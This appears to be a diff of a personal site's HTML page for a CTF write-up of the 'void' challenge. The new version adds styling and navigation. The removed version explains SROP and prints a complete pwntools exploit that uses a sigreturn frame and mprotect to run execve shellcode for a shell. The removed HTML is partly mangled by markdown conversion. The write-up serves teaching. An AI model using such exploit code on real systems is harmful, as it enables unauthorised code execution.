@@ -1,106 +1,134 @@
-<h1>void - 272</h1>
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="/w3css/3/w3.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css">
+<style>
+  
+ul {
+  list-style-type: none;
+  margin: 0;
+  padding: 0;
+  overflow: hidden;
+  background-color: #cecece;
+}
 
-<p>This was one of the good challenges that I tried during the CTF. It was based on a technique called SROP (Sigreturn Oriented Programming).</p>
+img{
+	border-radius: 8px;
+	display: block;
+  	margin-left: auto;
+  	margin-right: auto;
+	width: 100%;
+	max-width: 300px;
+}
+.writeup{
+  width: 100%;
+  max-width: 750px;
+  padding: 10px;
+  border: 5px solid gray;
+  border-style: dotted solid;
+  margin-left: auto;
+  margin-right: auto;
+	
+}
+ul.ingredients {
+  list-style-type: circle;
+}
+	
+li {
+  float: left;
+}
 
-<p>The purpose of this challenge was to defeat ASLR and so the binary as such consisted of only two functions - <code>main</code> and <code>_start</code> both written in simple assembly making use of syscalls.</p>
+li.ingredients{
+	text-align: left;
+	}
+li a, .dropbtn   {
+  display: inline-block;
+  color: white;
+  text-align: center;
+  padding: 14px 16px;
+  text-decoration: none;
+}
 
-<p>I&rsquo;ll take you through challenge and how I solved it!</p>
+li a:hover, .dropdown:hover .dropbtn {
+  background-color: grey;
+}
 
-<h2>Preliminary checks:</h2>
+li.dropdown {
+  display: inline-block;
+}
 
-<p><code>
+.dropdown-content {
+  display: none;
+  position: absolute;
+  background-color: silver;
+  min-width: 160px;
+  box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
+  z-index: 1;
+}
+
+.dropdown-content a {
+  color: black;
+  padding: 12px 16px;
+  text-decoration: none;
+  display: block;
+  text-align: left;
+}
+
+.dropdown-content a:hover {background-color: #f1f1f1;}
+
+.dropdown:hover .dropdown-content {
+  display: block;
+}
+
+h1{
+   text-align:center;
+   -webkit-text-decoration-line: overline underline; /* Safari */
+   text-decoration-line: overline underline;
+}
+h2{
+   text-decoration-line: underline;
+}
+
+	
+</style>
+</head>
+<body>
+ 
+ <ul>
+  <li><a class="active" href="../index.html">Home</a></li>
+  <li class="dropdown">
+  	<a href="javascript:void(0)" class="droptn">Menu</a>
+  	<div class="dropdown-content">
+		<a href="../docs/CTF-writeup.html">CTF Writeups</a>
+		<a href="#binaryexploitation">Binary Exploitation</a>
+		<a href="#poemsandstories">Poems and Short Stories</a>
+		<a href="../docs/food.html">Food</a>
+	</div>
+  </li>
+  <li><a href="#contact">Contact</a></li>
+  <li><a href="../docs/about.html">About</a></li>
+  
+ </ul>
+<p>     </p>
+<p>     </p>
+<img src="../../images/tamuctf.jpg" width="350" height="263" alt="void">
+<p>     </p>
+<div class="writeup">
+	<h1> Void</h1>
+	<h2> Points: 272</h2>
+		<p> This was one of the good challenges that I tried during the CTF. It was based on a technique called SROP (Sigreturn Oriented Programming). </p>
+
+   <p><code>The purpose of this challenge was to defeat ASLR and so the binary as such consisted of only two functions - `main` and `_start` both written in simple assembly making use of syscalls. 
+      I'll take you through challenge and how I solved it! </code></p>
+	<h2> Preliminary Analysis: </h2>
+   <p><code>```
 void: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=7fd635b160836aff1b92af6f203e3b1f160f54cc, not stripped
-</code>
-<code>
-Canary                        : ✘
-NX                            : ✓
-PIE                           : ✘
-Fortify                       : ✘
-RelRO                         : ✘
-gef➤  
-</code>
-As we can see, it is a 64-bit statically linked binary and only NX is enabled! So we&rsquo;ll need to figure out a way to inject shellcode and execute, if at all we use that approach. We will see how that can be done soon enough!
-For now let&rsquo;s analyze the binary further!</p>
+      ```</code></p>
 
-<h2>Analysis:</h2>
+</div>
 
-<p>```
-gef➤  info functions
-All defined functions:</p>
-
-<p>Non-debugging symbols:
-0x0000000000401000  main
-0x0000000000401020  <em>start
-gef➤  disas main
-Dump of assembler code for function main:
-   0x0000000000401000 &lt;+0>: mov    rax,0x0
-   0x0000000000401007 &lt;+7>: mov    rdi,0x0
-   0x000000000040100e &lt;+14>:    mov    rsi,rsp
-   0x0000000000401011 &lt;+17>:    mov    rdx,0x7d0
-   0x0000000000401018 &lt;+24>:    syscall
-   0x000000000040101a &lt;+26>:    ret  <br/>
-End of assembler dump.
-gef➤  disas </em>start
-Dump of assembler code for function <em>start:
-   0x0000000000401020 &lt;+0>: xor    eax,eax
-   0x0000000000401022 &lt;+2>: call   0x401000 <main>
-   0x0000000000401027 &lt;+7>: mov    rax,0x3c
-   0x000000000040102e &lt;+14>:    mov    rdi,0x0
-   0x0000000000401035 &lt;+21>:    syscall
-   0x0000000000401037 &lt;+23>:    ret  <br/>
-End of assembler dump.
-gef➤<br/>
-<code>``
-Above is the assmbly dump for the two functions</code>main<code>and</code></em>start<code>. As we can see there are no other functions, and the binary is statically linked, with no procedure linkage table or got address available during run time. Due to this, it becomes a challenge to obtain a leak!
-Hoewever if we dive into the program, we can see that, the</code>main()` function reads input from user. However, there is no stack frame defined and rsi points to the top of the stack. So eventually whatever input we give, it will remain at the top of the stack and will get executed as the next instruction.</p>
-
-<p>So how do we go about it? Before discussing that, let us understand what does SROP mean and how it works.</p>
-
-<h2>SROP</h2>
-
-<p>SROP stands for Sigreturn Oriented Programming and unlike Return Oriented Programming (ROP), it requires only two gadgets: <code>syscall</code> and a way to set <code>rax</code> register to <code>0xf</code>. In this challenge, it was quite difficult to write 0xf to rax as there weren&rsquo;t suitable gadgets available. But we can make use of the read syscall in main() to read 0xf bytes of input. With this, rax will store the number of characters read, i.e 0xf. Then we call syscall on it. This process comprises of the sigreturn syscall.</p>
-
-<p>The sigreturn is used to return from the signal handler and to clean up the stack frame after a signal has been unblocked. And &ldquo;cleaning up the stack frame&rdquo; really means it&rsquo;s restoring important context data that has been saved on the stack temporarily. This data includes values of all registers and some things that are unrelevant for exploitation, which is also the reason why at least 300 bytes are required for it to work. Since we can read upto 2000 bytes of data, it won&rsquo;t be a problem.</p>
-
-<p>For exploitation sake, we make use of <code>SigreturnFrame()</code> available in pwntools. We can in fact control all registers with this gadget. Before moving onto the exploit, I&rsquo;d like to remind you that NX is enabled, and since there is no libc we canot ret2libc either. So to break this barrier, we can use the mprotect syscall, to give <code>rwx</code> permissions to a certain bss section, wherein we can read our shellcode to, and execute it. As there is no stack frame defined, we add a stack frame with <code>asm(add rsp, 100)</code>, place our shellcode into it, and execute it. (The shellcode used is an execve 64-bit)</p>
-
-<h2>Exploit:</h2>
-
-<p>```
-from pwn import *
-context.arch = &lsquo;amd64&rsquo;
-context.log_level = &ldquo;debug&rdquo;</p>
-
-<h1>p = remote(&ldquo;tamuctf.com&rdquo;, 443, ssl=True, sni=&ldquo;void&rdquo;)</h1>
-
-<p>p = process(&lsquo;./void&rsquo;)</p>
-
-<h1>gdb.attach(p, gdbscript=&lsquo;set disassembly-flavor intel\nb*main\nc\n&rsquo;)</h1>
-
-<p>main = 0x0000000000401000
-ret = 0x40101a
-syscall = 0x0000000000401018
-start = 0x400020</p>
-
-<p>frame = SigreturnFrame()
-frame.rax = 10
-frame.rdi = 0x00000000400000
-frame.rsi = 0x1000
-frame.rdx = 0x7
-frame.rsp = 0x00000000400018# ptr to start
-frame.rip = syscall# mprotect syscall</p>
-
-<p>chain = p64(main)</p>
-
-<p>print(str(frame))
-pay = p64(main) + p64(syscall) + bytes(frame)
-p.send(pay)
-sleep(0.1)</p>
-
-<p>p.send(p64(syscall).ljust(15, b'\x00'))
-sleep(0.1)
-p.send(p64(start) + asm(&lsquo;add rsp, 100&rsquo;) + asm(shellcraft.sh()))
-sleep(0.1)</p>
-
-<p>p.interactive()
-```</p>
+</body>
+</html>
